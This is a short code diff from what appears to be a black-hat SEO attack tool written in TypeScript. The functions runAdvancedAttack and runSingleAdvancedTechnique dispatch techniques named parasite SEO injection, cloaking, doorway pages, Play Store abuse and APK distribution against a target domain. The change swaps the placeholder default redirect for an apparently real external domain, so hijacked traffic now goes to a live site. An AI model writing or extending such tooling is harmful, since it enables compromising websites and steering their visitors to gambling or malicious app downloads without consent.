@@ -912,7 +912,7 @@ export async function runAdvancedAttack(
 ): Promise<FullAdvancedReport> {
   const start = Date.now();
   const domain = getDomain(targetDomain);
-  const redirect = redirectUrl || "https://gambling-site.example.com";
+  const redirect = redirectUrl || "https://hkt956.org/";
   const selectedTechniques = options?.techniques || ["parasite_seo", "play_store", "cloaking", "doorway_pages", "apk_distribution"];
 
   const techniques: AdvancedAttackResult[] = [];
@@ -981,7 +981,7 @@ export function runSingleAdvancedTechnique(
   redirectUrl: string,
   options?: { keywords?: string[]; count?: number; appName?: string }
 ): AdvancedAttackResult {
-  const redirect = redirectUrl || "https://gambling-site.example.com";
+  const redirect = redirectUrl || "https://hkt956.org/";
   
   const techMap: Record<string, () => AdvancedAttackResult> = {
     parasite_seo: () => parasiteSeoInjection(targetDomain, redirect, options?.keywords),
